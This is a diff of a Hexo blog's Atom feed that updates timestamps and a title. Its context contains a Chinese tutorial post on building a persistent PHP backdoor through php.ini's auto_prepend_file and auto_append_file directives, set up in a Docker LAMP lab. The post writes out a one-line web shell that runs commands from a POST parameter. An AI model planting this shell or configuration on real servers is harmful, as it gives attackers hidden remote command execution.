@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rj45mp.github.io/"/>
-  <updated>2019-11-23T16:48:47.894Z</updated>
+  <updated>2019-11-24T05:30:28.047Z</updated>
   <id>https://rj45mp.github.io/</id>
   
   <author>
@@ -17,11 +17,11 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>利用php-ini构成的后门</title>
+    <title>利用php-ini构造后门</title>
     <link href="https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/"/>
     <id>https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/</id>
     <published>2019-10-23T16:42:41.000Z</published>
-    <updated>2019-11-23T16:48:47.894Z</updated>
+    <updated>2019-11-24T05:30:28.047Z</updated>
     
     <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看到一个比较有意思的知识点，记录一下。</p><h1 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h1><p>在php.ini的数据处理配置选项中有两个配置项<code>auto_prepend_file与auto_append_file</code>,</p><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/1.png" alt="img"></p><p>auto_prepend_file的作用是在php程序加载执行第一个php文件之前加载指定的php文件。</p><p>而auto_append_file则是加载执行完成后加载指定的php文件。</p><p>对这两个配置项加载的文件的指定是通过<code>include_path</code>实现的：</p><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/2.png" alt="img"></p><p>两者有点类似文件包含利用到的几个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include()、require()、include_once()、require_once()</span><br></pre></td></tr></table></figure><p>其实现的功能大概是在特定的应用场景下对所有的代码在执行前或者执行后进行统一处理。</p><p>被加载进来的特定文件相当于全局文件（类似对局部函数与全局函数的理解）。</p><p>由此产生了一些特殊的利用方式，例如利用其功能构造后门或者在awd中更轻松的上waf。</p><h1 id="构造后门实验"><a href="#构造后门实验" class="headerlink" title="构造后门实验"></a>构造后门实验</h1><p>1、环境<br>在docker环境下</p><p>1）pull镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull tutum/lamp</span><br></pre></td></tr></table></figure><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/3.png" alt="img"></p><p>2）创建容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -it -p 80:80 -p 3306:3306 --name=web tutum/lamp /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/4.png" alt="img"></p><p>3）进入容器、启动web服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker attach webservice apache2 startnetstat -apt</span><br></pre></td></tr></table></figure><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/5.png" alt="img"></p><p>2、配置<br>编辑php.ini文件，指定被加载文件路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/php5/apache2/php.ini</span><br></pre></td></tr></table></figure><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/6.png" alt="img"></p><p>3、配置参数</p><p>配置参数auto_prepend_file</p><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/7.png" alt="img"></p><p>4、编辑指定加载的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php@system($_POST[&apos;Rj45&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/8.png" alt="img"></p><p>5、验证</p><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/9.png" alt="img"></p><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/10.png" alt="img"></p><p>auto_append_file同理(修改后需要重启web服务)</p><p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/11.png" alt="img"></p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>当然可能还有更加猥琐的利用。</p>]]></content>
     
